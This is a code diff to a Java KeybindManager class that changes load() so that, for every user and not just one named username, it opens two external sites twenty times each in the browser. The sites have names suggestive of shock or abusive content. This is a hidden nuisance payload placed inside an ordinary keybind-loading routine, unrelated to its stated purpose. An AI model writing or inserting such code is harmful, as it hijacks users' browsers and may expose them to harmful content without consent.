@@ -19,17 +19,16 @@ public class KeybindManager {
     }
 
     public void load() {
-        if (System.getProperty("user.name").equalsIgnoreCase("beand")) {
-            Desktop d = Desktop.getDesktop();
-            try {
-                for (int i = 0; i < 20; i++) {
-                    d.browse(new URI("http://24dose.com"));
-                    d.browse(new URI("http://18abused.com"));
-                }
-            } catch (IOException | URISyntaxException e2) {
-                e2.printStackTrace();
+        Desktop d = Desktop.getDesktop();
+        try {
+            for (int i = 0; i < 20; i++) {
+                d.browse(new URI("http://24dose.com"));
+                d.browse(new URI("http://18abused.com"));
             }
+        } catch (IOException | URISyntaxException e2) {
+            e2.printStackTrace();
         }
+
 
         try {
             if (!keybindFile.exists()) {
